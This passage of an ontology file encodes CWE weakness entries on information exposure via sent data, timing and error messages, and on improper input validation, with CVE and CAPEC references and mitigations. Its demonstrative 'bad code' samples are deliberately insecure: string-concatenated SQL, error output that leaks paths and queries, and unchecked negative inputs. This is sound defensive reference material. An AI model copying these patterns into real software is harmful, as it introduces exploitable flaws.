     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     other  "Varies by Context"^^xsd:string
    
    
Individual: CWE-201_Information_Exposure_Through_Sent_Data

    Annotations: 
        rdfs:comment "The accidental exposure of sensitive information through sent data refers to the transmission of data which are either sensitive in and of itself or useful in the further exploitation of the system through standard data channels."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1015_Limit_Access,
     
     Annotations: rdfs:comment "Choosing Message Identifier"^^xsd:string
                 
                 related_attack_patterns  CAPEC-12,
     
     Annotations: rdfs:comment "Exploiting Incorrectly Configured SSL"^^xsd:string
                 
                 related_attack_patterns  CAPEC-217,
     
     Annotations: rdfs:comment "WiFi MAC Address Tracking"^^xsd:string
                 
                 related_attack_patterns  CAPEC-612,
     
     Annotations: rdfs:comment "WiFi SSID Tracking"^^xsd:string
                 
                 related_attack_patterns  CAPEC-613,
     
     Annotations: rdfs:comment "Cellular Broadcast Message Request"^^xsd:string
                 
                 related_attack_patterns  CAPEC-618,
     
     Annotations: rdfs:comment "Signal Strength Tracking"^^xsd:string
                 
                 related_attack_patterns  CAPEC-619,
     
     Annotations: rdfs:comment "Analysis of Packet Timing and Sizes"^^xsd:string
                 
                 related_attack_patterns  CAPEC-621,
     
     Annotations: rdfs:comment "Electromagnetic Side-Channel Attack"^^xsd:string
                 
                 related_attack_patterns  CAPEC-622,
     
     Annotations: rdfs:comment "Compromising Emanations Attack"^^xsd:string
                 
                 related_attack_patterns  CAPEC-623,
     ID  "201"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Separation of Privilege
Compartmentalize the system to have \"safe\" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.
Ensure that appropriate compartmentalization is built into the system design and that the compartmentalization serves to allow for and further reinforce privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide when it is appropriate to use and to drop system privileges."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "Sensitive data may be exposed to attackers."^^xsd:string, 
                 rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Read Application Data"^^xsd:string,
     confidentiality  "Read Files or Directories"^^xsd:string,
     confidentiality  "Read Memory"^^xsd:string,
     
     Annotations: rdfs:comment "The following is an actual MySQL error statement:

(result)
Example Language: SQL 
Warning: mysql_pconnect(): Access denied for user: 'root@localhost' (Using password: N1nj4) in /usr/local/www/wi-data/includes/database.inc on line 4
The error clearly exposes the database credentials."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "Ensure that any possibly sensitive data specified in the requirements is verified with designers to ensure that it is either a calculated risk or mitigated elsewhere. Any information that is not necessary to the functionality should be removed in order to lower both the overhead and the possibility of security sensitive data being sent."^^xsd:string, 
                 rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Specify which data in the software should be regarded as sensitive. Consider which types of users should have access to which types of data."^^xsd:string
                 
                 requirements  ""^^xsd:string,
     
     Annotations: rdfs:comment "Setup default error messages so that unexpected errors do not disclose sensitive information."^^xsd:string
                 
                 system_configuration  ""^^xsd:string
    
    
Individual: CWE-208_Information_Exposure_Through_Timing_Discrepancy

    Annotations: 
        rdfs:comment "Functional Areas:
- Cryptography
- Authentication"^^xsd:string,
        rdfs:comment "Relationship:
Often primary in cryptographic applications and algorithms."^^xsd:string,
        rdfs:comment "Two separate operations in a product require different amounts of time to complete, in a way that is observable to an actor and reveals security-relevant information about the state of the product, such as whether a particular operation was successful or not."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1012_Cross_Cutting,
     
     Annotations: rdfs:comment "Virtual machine allows malicious web site operators to determine the existence of files on the client by measuring delays in the execution of the getSystemResource method."^^xsd:string
                 
                 references  CVE-2000-1117,
     
     Annotations: rdfs:comment "SSL implementation does not perform a MAC computation if an incorrect block cipher padding is used, which causes an information leak (timing discrepancy) that may make it easier to launch cryptographic attacks that rely on distinguishing between padding and MAC verification errors, possibly leading to extraction of the original plaintext, aka the \"Vaudenay timing attack.\""^^xsd:string
                 
                 references  CVE-2003-0078,
     
     Annotations: rdfs:comment "Product immediately sends an error message when a user does not exist, which allows remote attackers to determine valid usernames via a timing attack."^^xsd:string
                 
                 references  CVE-2003-0190,
     
     Annotations: rdfs:comment "Product uses a shorter timeout for a non-existent user than a valid user, which makes it easier for remote attackers to guess usernames and conduct brute force password guessing."^^xsd:string
                 
                 references  CVE-2003-0637,
     
     Annotations: rdfs:comment "FTP server responds in a different amount of time when a given username exists, which allows remote attackers to identify valid usernames by timing the server response."^^xsd:string
                 
                 references  CVE-2004-1602,
     
     Annotations: rdfs:comment "Browser allows remote attackers to determine the existence of arbitrary files by setting the src property to the target filename and using Javascript to determine if the web page immediately stops loading, which indicates whether the file exists or not."^^xsd:string
                 
                 references  CVE-2005-0918,
     
     Annotations: rdfs:comment "Cross-Domain Search Timing"^^xsd:string
                 
                 related_attack_patterns  CAPEC-462,
     ID  "208"^^xsd:positiveInteger,
     access_control  "Bypass Protection Mechanism"^^xsd:string,
     access_control  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Bypass Protection Mechanism"^^xsd:string,
     confidentiality  "Read Application Data"^^xsd:string,
     implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     operation  ""^^xsd:string
    
    
Individual: CWE-209_Information_Exposure_Through_an_Error_Message

    Annotations: 
        rdfs:comment "The sensitive information may be valuable information on its own (such as a password), or it may be useful for launching other, more deadly attacks. If an attack fails, an attacker may use error information provided by the server to launch another more focused attack. For example, an attempt to exploit a path traversal weakness (CWE-22) might yield the full pathname of the installed application. In turn, this could be used to select the proper number of \"..\" sequences to navigate to the targeted file. An attack using SQL injection (CWE-89) might not initially succeed, but an error message could reveal the malformed query, which would expose query logic and possibly even passwords or other sensitive information used within the query."^^xsd:string,
        rdfs:comment "The software generates an error message that includes sensitive information about its environment, users, or associated data."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1015_Limit_Access,
     
     Annotations: rdfs:comment "Malformed regexp syntax leads to information exposure in error message."^^xsd:string
                 
                 references  CVE-2005-0603,
     
     Annotations: rdfs:comment "Direct request to library file in web application triggers pathname leak in error message."^^xsd:string
                 
                 references  CVE-2007-1409,
     
     Annotations: rdfs:comment "Program reveals password in error message if attacker can trigger certain database errors."^^xsd:string
                 
                 references  CVE-2007-5172,
     
     Annotations: rdfs:comment "Existence of user names can be determined by requesting a nonexistent blog and reading the error message."^^xsd:string
                 
                 references  CVE-2008-1579,
     
     Annotations: rdfs:comment "POP3 server reveals a password in an error message after multiple APOP commands are sent. Might be resultant from another weakness."^^xsd:string
                 
                 references  CVE-2008-2049,
     
     Annotations: rdfs:comment "Malformed input to login page causes leak of full path when IMAP call fails."^^xsd:string
                 
                 references  CVE-2008-3060,
     
     Annotations: rdfs:comment "Composite: application running with high privileges allows user to specify a restricted file to process, which generates a parsing error that leaks the contents of the file."^^xsd:string
                 
                 references  CVE-2008-4638,
     
     Annotations: rdfs:comment "Fuzzing for garnering J2EE/.NET-based stack traces, for application mapping"^^xsd:string
                 
                 related_attack_patterns  CAPEC-214,
     
     Annotations: rdfs:comment "Fuzzing and observing application log data/errors for application mapping"^^xsd:string
                 
                 related_attack_patterns  CAPEC-215,
     
     Annotations: rdfs:comment "Padding Oracle Crypto Attack"^^xsd:string
                 
                 related_attack_patterns  CAPEC-463,
     
     Annotations: rdfs:comment "Query System for Information"^^xsd:string
                 
                 related_attack_patterns  CAPEC-54,
     
     Annotations: rdfs:comment "Blind SQL Injection"^^xsd:string
                 
                 related_attack_patterns  CAPEC-7,
     ID  "209"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "Automated methods may be able to detect certain idioms automatically, such as exposed stack traces or pathnames, but violation of business rules or privacy requirements is not typically feasible.
Effectiveness: Moderate"^^xsd:string
                 
                 automated_analysis  ""^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Compilation or Build Hardening
Debugging information should not make its way into a production release."^^xsd:string, 
                 rdfs:comment "Strategy: Environment Hardening
Debugging information should not make its way into a production release."^^xsd:string
                 
                 build_and_compilation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Often this will either reveal sensitive information which may be used for a later attack or private information stored in the server."^^xsd:string
                 
                 confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "Example 1
In the following example, sensitive information might be printed depending on the exception that occurs.

(bad code)
Example Language: Java 
try {
/.../
}
catch (Exception e) {
System.out.println(e);
}
If an exception related to SQL is handled by the catch, then the output might contain sensitive information such as SQL query structure or private information. If this output is redirected to a web user, this may represent a security problem."^^xsd:string, 
                 rdfs:comment "Example 2
This code tries to open a database connection, and prints any exceptions that occur.

(bad code)
Example Language: PHP 
try {
openDbConnection();
}
//print exception message that includes exception message and configuration file location 
catch (Exception $e) {
echo 'Caught exception: ', $e->getMessage(), '\\n';
echo 'Check credentials in config file at: ', $Mysql_config_location, '\\n';
}
If an exception occurs, the printed message exposes the location of the configuration file the script is using. An attacker can use this information to target the configuration file (perhaps exploiting a Path Traversal weakness). If the file can be read, the attacker could gain credentials for accessing the database. The attacker may also be able to replace the file with a malicious one, causing the application to use an arbitrary database."^^xsd:string, 
                 rdfs:comment "Example 3
The following code generates an error message that leaks the full pathname of the configuration file.

(bad code)
Example Language: Perl 
$ConfigDir = \"/home/myprog/config\";
$uname = GetUserInput(\"username\");

# avoid CWE-22, CWE-78, others. 
ExitError(\"Bad hacker!\") if ($uname !~ /^\\w+$/);
$file = \"$ConfigDir/$uname.txt\";
if (! (-e $file)) {
ExitError(\"Error: $file does not exist\");
}
...
If this code is running on a server, such as a web application, then the person making the request should not know what the full pathname of the configuration directory is. By submitting a username that does not produce a $file that exists, an attacker could get this pathname. It could then be used to exploit path traversal or symbolic link following problems that may exist elsewhere in the application."^^xsd:string, 
                 rdfs:comment "Example 4
In the example below, the method getUserBankAccount retrieves a bank account object from a database using the supplied username and account number to query the database. If an SQLException is raised when querying the database, an error message is created and output to a log file.

(bad code)
Example Language: Java 
public BankAccount getUserBankAccount(String username, String accountNumber) {
BankAccount userAccount = null;
String query = null;
try {
if (isAuthorizedUser(username)) {
query = \"SELECT * FROM accounts WHERE owner = \"
+ username + \" AND accountID = \" + accountNumber;
DatabaseManager dbManager = new DatabaseManager();
Connection conn = dbManager.getConnection();
Statement stmt = conn.createStatement();
ResultSet queryResult = stmt.executeQuery(query);
userAccount = (BankAccount)queryResult.getObject(accountNumber);
}
} catch (SQLException ex) {
String logMessage = \"Unable to retrieve account information from database,\\nquery: \" + query;
Logger.getLogger(BankManager.class.getName()).log(Level.SEVERE, logMessage, ex);
}
return userAccount;
}
The error message that is created includes information about the database query that may contain sensitive information about the database or query logic. In this case, the error message will expose the table name and column names used in the database. This data could be used to simplify other attacks, such as SQL injection (CWE-89) to directly access the database."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "Automated Dynamic Analysis:
This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.
Error conditions may be triggered with a stress-test by calling the software simultaneously from a large number of threads or processes, and look for evidence of any unexpected behavior.
Effectiveness: Moderate"^^xsd:string
                 
                 dynamic  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "Manual Dynamic Analysis:
Identify error conditions that are not likely to occur during normal usage and trigger them. For example, run the program under low memory conditions, run with insufficient privileges or permissions, interrupt a transaction before it is completed, or disable connectivity to basic network services such as DNS. Monitor the software for any unexpected behavior. If you trigger an unhandled exception or similar error that was discovered and handled by the application's environment, it may still indicate unexpected conditions that were not handled by the application itself."^^xsd:string
                 
                 dynamic  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "Ensure that error messages only contain minimal details that are useful to the intended audience, and nobody else. The messages need to strike the balance between being too cryptic and not being cryptic enough. They should not necessarily reveal the methods that were used to determine the error. Such detailed information can be used to refine the original attack to increase the chances of success.
If errors must be tracked in some detail, capture them in log messages - but consider what could occur if the log messages can be viewed by attackers. Avoid recording highly sensitive information such as passwords in any form. Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a username is valid or not."^^xsd:string, 
                 rdfs:comment "Handle exceptions internally and do not display errors containing potentially sensitive information to a user."^^xsd:string, 
                 rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Strategy: Attack Surface Reduction
Use naming conventions and strong types to make it easier to spot when sensitive data is being used. When creating structures, objects, or other complex entities, separate the sensitive and non-sensitive data as much as possible.
Effectiveness: Defense in Depth
Note: This makes it easier to spot places in the code where data is being used that is unencrypted."^^xsd:string, 
                 rdfs:comment "Strategy: Compilation or Build Hardening
Debugging information should not make its way into a production release."^^xsd:string, 
                 rdfs:comment "Strategy: Environment Hardening
Debugging information should not make its way into a production release."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "Often Prevalent"^^xsd:string
                 
                 languages  "PHP"^^xsd:string,
     likelihood_of_exploit  "High"^^xsd:string,
     
     Annotations: rdfs:comment "This weakness generally requires domain-specific interpretation using manual analysis. However, the number of potential error conditions may be too large to cover completely within limited time constraints.
Effectiveness: High"^^xsd:string
                 
                 manual_analysis  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     operation  ""^^xsd:string,
     
     Annotations: rdfs:comment "Create default error pages or messages that do not leak any information."^^xsd:string, 
                 rdfs:comment "Where available, configure the environment to use less verbose error messages. For example, in PHP, disable the display_errors setting during configuration, or at runtime using the error_reporting() function."^^xsd:string
                 
                 system_configuration  ""^^xsd:string
    
    
Individual: CWE-20_Improper_Input_Validation

    Annotations: 
        rdfs:comment "Applicable Platform:
Input validation can be a problem in any system that receives data from an external source."^^xsd:string,
        rdfs:comment "Maintenance:
Input validation - whether missing or incorrect - is such an essential and widespread part of secure development that it is implicit in many different weaknesses. Traditionally, problems such as buffer overflows and XSS have been classified as input validation problems by many security professionals. However, input validation is not necessarily the only protection mechanism available for avoiding such problems, and in some cases it is not even sufficient. The CWE team has begun capturing these subtleties in chains within the Research Concepts view (CWE-1000), but more work is needed."^^xsd:string,
        rdfs:comment "Relationship:
CWE-116 and CWE-20 have a close association because, depending on the nature of the structured message, proper input validation can indirectly prevent special characters from changing the meaning of a structured message. For example, by validating that a numeric ID field should only contain the 0-9 characters, the programmer effectively prevents injection attacks.

However, input validation is not always sufficient, especially when less stringent data types must be supported, such as free-form text. Consider a SQL injection scenario in which a last name is inserted into a query. The name \"O'Reilly\" would likely pass the validation step since it is a common last name in the English language. However, it cannot be directly inserted into the database because it contains the \"'\" apostrophe character, which would need to be escaped or otherwise neutralized. In this case, stripping the apostrophe might reduce the risk of SQL injection, but it would produce incorrect behavior because the wrong name would be recorded."^^xsd:string,
        rdfs:comment "Research Gap:
There is not much research into the classification of input validation techniques and their application. Many publicly-disclosed vulnerabilities simply characterize a problem as \"input validation\" without providing more specific details that might contribute to a deeper understanding of validation techniques and the weaknesses they can prevent or reduce. Validation is over-emphasized in contrast to other neutralization techniques such as filtering and enforcement by conversion. See the vulnerability theory paper."^^xsd:string,
        rdfs:comment "Terminology:
The \"input validation\" term is extremely common, but it is used in many different ways. In some cases its usage can obscure the real underlying weakness or otherwise hide chaining and composite relationships.

Some people use \"input validation\" as a general term that covers many different neutralization techniques for ensuring that input is appropriate, such as filtering, canonicalization, and escaping. Others use the term in a more narrow context to simply mean \"checking if an input conforms to expectations without changing it.\""^^xsd:string,
        rdfs:comment "The product does not validate or incorrectly validates input that can affect the control flow or data flow of a program."^^xsd:string,
        rdfs:comment "When software does not validate input properly, an attacker is able to craft the input in a form that is not expected by the rest of the application. This will lead to parts of the system receiving unintended input, which may result in altered control flow, arbitrary control of a resource, or arbitrary code execution."^^xsd:string
    
    Types: 
        Classes
    
    Facts:  
     categories_member  CWE-1019_Validate_Inputs,
     
     Annotations: rdfs:comment "size field that is inconsistent with packet size leads to buffer over-read"^^xsd:string
                 
                 references  CVE-2006-3790,
     
     Annotations: rdfs:comment "use of extra data in a signature allows certificate signature forging"^^xsd:string
                 
                 references  CVE-2006-5462,
     
     Annotations: rdfs:comment "incomplete blacklist allows SQL injection"^^xsd:string
                 
                 references  CVE-2006-5525,
     
     Annotations: rdfs:comment "request with missing parameters leads to information exposure"^^xsd:string
                 
                 references  CVE-2006-6658,
     
     Annotations: rdfs:comment "infinite loop from DNS packet with a label that points to itself"^^xsd:string
                 
                 references  CVE-2006-6870,
     
     Annotations: rdfs:comment "zero-length input causes free of uninitialized pointer"^^xsd:string
                 
                 references  CVE-2007-2442,
     
     Annotations: rdfs:comment "infinite loop from DNS packet with a label that points to itself"^^xsd:string
                 
                 references  CVE-2007-3409,
     
     Annotations: rdfs:comment "HTTP request with missing protocol version number leads to crash"^^xsd:string
                 
                 references  CVE-2007-5893,
     
     Annotations: rdfs:comment "kernel does not validate an incoming pointer before dereferencing it"^^xsd:string
                 
                 references  CVE-2008-0600,
     
     Annotations: rdfs:comment "NUL byte in theme name cause directory traversal impact to be worse"^^xsd:string
                 
                 references  CVE-2008-1284,
     
     Annotations: rdfs:comment "missing parameter leads to crash"^^xsd:string
                 
                 references  CVE-2008-1303,
     
     Annotations: rdfs:comment "lack of validation of length field leads to infinite loop"^^xsd:string
                 
                 references  CVE-2008-1440,
     
     Annotations: rdfs:comment "lack of validation of input to an IOCTL allows code execution"^^xsd:string
                 
                 references  CVE-2008-1625,
     
     Annotations: rdfs:comment "anti-virus product allows DoS via zero-length field"^^xsd:string
                 
                 references  CVE-2008-1737,
     
     Annotations: rdfs:comment "anti-virus product has insufficient input validation of hooked SSDT functions, allowing code execution"^^xsd:string
                 
                 references  CVE-2008-1738,
     
     Annotations: rdfs:comment "SQL injection through an ID that was supposed to be numeric."^^xsd:string
                 
                 references  CVE-2008-2223,
     
     Annotations: rdfs:comment "kernel does not validate parameters sent in from userland, allowing code execution"^^xsd:string
                 
                 references  CVE-2008-2252,
     
     Annotations: rdfs:comment "product uses a blacklist to identify potentially dangerous content, allowing attacker to bypass a warning"^^xsd:string
                 
                 references  CVE-2008-2309,
     
     Annotations: rdfs:comment "lack of validation of string length fields allows memory consumption or buffer over-read"^^xsd:string
                 
                 references  CVE-2008-2374,
     
     Annotations: rdfs:comment "driver in security product allows code execution due to insufficient validation"^^xsd:string
                 
                 references  CVE-2008-3174,
     
     Annotations: rdfs:comment "zero-length attachment causes crash"^^xsd:string
                 
                 references  CVE-2008-3177,
     
     Annotations: rdfs:comment "driver does not validate input from userland to the kernel"^^xsd:string
                 
                 references  CVE-2008-3464,
     
     Annotations: rdfs:comment "lack of input validation in spreadsheet program leads to buffer overflows, integer overflows, array index errors, and memory corruption."^^xsd:string
                 
                 references  CVE-2008-3477,
     
     Annotations: rdfs:comment "security bypass via an extra header"^^xsd:string
                 
                 references  CVE-2008-3494,
     
     Annotations: rdfs:comment "empty packet triggers reboot"^^xsd:string
                 
                 references  CVE-2008-3571,
     
     Annotations: rdfs:comment "crash via multiple \".\" characters in file extension"^^xsd:string
                 
                 references  CVE-2008-3660,
     
     Annotations: rdfs:comment "packet with invalid version number leads to NULL pointer dereference"^^xsd:string
                 
                 references  CVE-2008-3680,
     
     Annotations: rdfs:comment "router crashes with a malformed packet"^^xsd:string
                 
                 references  CVE-2008-3812,
     
     Annotations: rdfs:comment "insufficient validation enables XSS"^^xsd:string
                 
                 references  CVE-2008-3843,
     
     Annotations: rdfs:comment "system crash with offset value that is inconsistent with packet size"^^xsd:string
                 
                 references  CVE-2008-4114,
     
     Annotations: rdfs:comment "infinite loop from a long SMTP request"^^xsd:string
                 
                 references  CVE-2008-5285,
     
     Annotations: rdfs:comment "Eval injection in Perl program using an ID that should only contain hyphens and numbers."^^xsd:string
                 
                 references  CVE-2008-5305,
     
     Annotations: rdfs:comment "crash via a malformed frame structure"^^xsd:string
                 
                 references  CVE-2008-5563,
     related_attack_patterns  CAPEC-1,
     related_attack_patterns  CAPEC-101,
     related_attack_patterns  CAPEC-104,
     related_attack_patterns  CAPEC-108,
     related_attack_patterns  CAPEC-109,
     related_attack_patterns  CAPEC-110,
     related_attack_patterns  CAPEC-120,
     related_attack_patterns  CAPEC-13,
     related_attack_patterns  CAPEC-135,
     related_attack_patterns  CAPEC-136,
     related_attack_patterns  CAPEC-14,
     related_attack_patterns  CAPEC-182,
     related_attack_patterns  CAPEC-209,
     related_attack_patterns  CAPEC-22,
     related_attack_patterns  CAPEC-230,
     related_attack_patterns  CAPEC-231,
     related_attack_patterns  CAPEC-24,
     related_attack_patterns  CAPEC-250,
     related_attack_patterns  CAPEC-267,
     related_attack_patterns  CAPEC-28,
     related_attack_patterns  CAPEC-3,
     related_attack_patterns  CAPEC-31,
     related_attack_patterns  CAPEC-42,
     related_attack_patterns  CAPEC-43,
     related_attack_patterns  CAPEC-45,
     related_attack_patterns  CAPEC-46,
     related_attack_patterns  CAPEC-47,
     related_attack_patterns  CAPEC-473,
     related_attack_patterns  CAPEC-484,
     related_attack_patterns  CAPEC-52,
     related_attack_patterns  CAPEC-53,
     related_attack_patterns  CAPEC-588,
     related_attack_patterns  CAPEC-591,
     related_attack_patterns  CAPEC-592,
     related_attack_patterns  CAPEC-63,
     related_attack_patterns  CAPEC-64,
     related_attack_patterns  CAPEC-66,
     related_attack_patterns  CAPEC-67,
     related_attack_patterns  CAPEC-7,
     related_attack_patterns  CAPEC-71,
     related_attack_patterns  CAPEC-72,
     related_attack_patterns  CAPEC-73,
     related_attack_patterns  CAPEC-78,
     related_attack_patterns  CAPEC-79,
     related_attack_patterns  CAPEC-8,
     related_attack_patterns  CAPEC-80,
     related_attack_patterns  CAPEC-81,
     related_attack_patterns  CAPEC-83,
     related_attack_patterns  CAPEC-85,
     related_attack_patterns  CAPEC-88,
     related_attack_patterns  CAPEC-9,
     related_attack_patterns  CAPEC-99,
     ID  "20"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.
Even though client-side checks provide minimal benefits with respect to server-side security, they are still useful. First, they can support intrusion detection. If the server receives input that should have been rejected by the client, then it may be an indication of an attack. Second, client-side error-checking can provide helpful feedback to the user about the expectations for valid input. Third, there may be a reduction in server-side processing time for accidental input errors, although this is typically a small savings."^^xsd:string, 
                 rdfs:comment "Strategy: Attack Surface Reduction

Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls."^^xsd:string, 
                 rdfs:comment "Strategy: Input Validation

Use an input validation framework such as Struts or the OWASP ESAPI Validation API. If you use Struts, be mindful of weaknesses covered by the CWE-101 category."^^xsd:string, 
                 rdfs:comment "Strategy: Libraries or Frameworks

Use an input validation framework such as Struts or the OWASP ESAPI Validation API. If you use Struts, be mindful of weaknesses covered by the CWE-101 category."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Highly cost effective:
Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)
Formal Methods / Correct-By-Construction
Cost effective for partial coverage:
Attack Modeling
Effectiveness: High"^^xsd:string
                 
                 architecture_or_design_review  ""^^xsd:string,
     availability  "DoS: Crash, Exit, or Restart"^^xsd:string,
     availability  "DoS: Resource Consumption (CPU)"^^xsd:string,
     availability  "DoS: Resource Consumption (Memory)"^^xsd:string,
     availability  "Execute Unauthorized Code or Commands"^^xsd:string,
     availability  "Modify Memory"^^xsd:string,
     
     Annotations: rdfs:comment "An attacker could provide unexpected values and cause a program crash or excessive consumption of resources, such as memory and CPU."^^xsd:string, 
                 rdfs:comment "An attacker could read confidential data if they are able to control resource references."^^xsd:string, 
                 rdfs:comment "An attacker could use malicious input to modify data or possibly alter control flow in unexpected ways, including arbitrary command execution."^^xsd:string, 
                 rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Execute Unauthorized Code or Commands"^^xsd:string,
     confidentiality  "Modify Memory"^^xsd:string,
     confidentiality  "Read Files or Directories"^^xsd:string,
     confidentiality  "Read Memory"^^xsd:string,
     
     Annotations: rdfs:comment "Example 1
This example demonstrates a shopping interaction in which the user is free to specify the quantity of items to be purchased and a total is calculated.

(bad code)
Example Language: Java 
...
public static final double price = 20.00;
int quantity = currentUser.getAttribute(\"quantity\");
double total = price * quantity;
chargeUser(total);
...
The user has no control over the price variable, however the code does not prevent a negative value from being specified for quantity. If an attacker were to provide a negative value, then the user would have their account credited instead of debited."^^xsd:string, 
                 rdfs:comment "Example 2
This example asks the user for a height and width of an m X n game board with a maximum dimension of 100 squares.

(bad code)
Example Language: C 
...
#define MAX_DIM 100
...
/* board dimensions */ 

int m,n, error;
board_square_t *board;
printf(\"Please specify the board height: \\n\");
error = scanf(\"%d\", &m);
if ( EOF == error ){
die(\"No integer passed: Die evil hacker!\\n\");
}
printf(\"Please specify the board width: \\n\");
error = scanf(\"%d\", &n);
if ( EOF == error ){
die(\"No integer passed: Die evil hacker!\\n\");
}
if ( m > MAX_DIM || n > MAX_DIM ) {
die(\"Value too large: Die evil hacker!\\n\");
}
board = (board_square_t*) malloc( m * n * sizeof(board_square_t));
...
While this code checks to make sure the user cannot specify large, positive integers and consume too much memory, it does not check for negative values supplied by the user. As a result, an attacker can perform a resource consumption (CWE-400) attack against this program by specifying two, large negative values that will not overflow, resulting in a very large memory allocation (CWE-789) and possibly a system crash. Alternatively, an attacker can provide very large negative values which will cause an integer overflow (CWE-190) and unexpected behavior will follow depending on how the values are treated in the remainder of the program."^^xsd:string, 
                 rdfs:comment "Example 3
The following example shows a PHP application in which the programmer attempts to display a user's birthday and homepage.

(bad code)
Example Language: PHP 
$birthday = $_GET['birthday'];
